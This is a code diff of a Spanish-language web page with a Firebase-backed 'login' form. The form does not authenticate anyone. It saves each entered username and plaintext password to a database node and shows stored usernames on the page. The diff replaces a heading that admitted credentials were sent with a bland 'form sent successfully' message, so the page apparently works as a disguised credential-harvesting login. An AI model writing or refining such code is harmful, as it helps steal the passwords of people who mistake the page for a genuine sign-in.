@@ -13,7 +13,6 @@
         <h2>Iniciar sesión</h2>
         <form id="login">
             <div class="input-group">
-                <!-- Campo para nombre de usuario en lugar de correo electrónico -->
                 <input type="text" id="username" placeholder="Nombre de usuario" required>
             </div>
             <div class="input-group">
@@ -27,7 +26,7 @@
     <div id="responsesForm" class="form-container" style="display:none;">
         <h2>Formulario de Respuestas</h2>
         <form id="responseForm">
-            <h3>Nombre de usuario y Contraseña enviados</h3>
+            <h3>Formulario enviado con éxito</h3>
             <button type="submit" class="btn">Enviar Respuesta</button>
         </form>
 
@@ -69,12 +68,12 @@
             // Función para cargar respuestas desde Firebase
             function cargarRespuestas() {
                 responseContainer.innerHTML = ""; // Limpiar respuestas previas
-                const respuestasRef = ref(db, "respuestas");
+                const respuestas2Ref = ref(db, "respuestas2"); // Cambiado de 'respuestas' a 'respuestas2'
 
-                onValue(respuestasRef, (snapshot) => {
+                onValue(respuestas2Ref, (snapshot) => {
                     responseContainer.innerHTML = ""; // Limpiar antes de agregar nuevas respuestas
                     snapshot.forEach((childSnapshot) => {
-                        const respuesta = childSnapshot.val().texto;
+                        const respuesta = childSnapshot.val().username; // Cambiar de "texto" a "username"
                         const div = document.createElement("div");
                         div.classList.add("response");
                         div.textContent = respuesta;
@@ -90,13 +89,13 @@
                 const username = document.getElementById("username").value;
                 const password = document.getElementById("password").value;
 
-                // Aquí, no estamos validando el nombre de usuario ni la contraseña, simplemente ocultamos el login y mostramos el formulario de respuestas.
+                // Aquí, no estamos validando el correo ni la contraseña, simplemente ocultamos el login y mostramos el formulario de respuestas.
                 if (username && password) {
                     loginForm.style.display = "none";
                     responsesForm.style.display = "block";
                     
                     // Guardamos el nombre de usuario y la contraseña en Firebase
-                    const respuestas2Ref = ref(db, "respuestas2");
+                    const respuestas2Ref = ref(db, "respuestas2"); // Cambiado de 'respuestas' a 'respuestas2'
                     push(respuestas2Ref, {
                         username: username,
                         password: password,
@@ -107,7 +106,7 @@
                         console.error("Error al guardar datos en Firebase:", error);
                     });
 
-                    cargarRespuestas2();
+                    cargarRespuestas();
                 } else {
                     alert("Por favor ingresa un nombre de usuario y una contraseña.");
                 }
@@ -120,7 +119,7 @@
             });
 
             // Cargar respuestas al cargar la página
-            cargarRespuestas2();
+            cargarRespuestas();
         });
     </script>
 
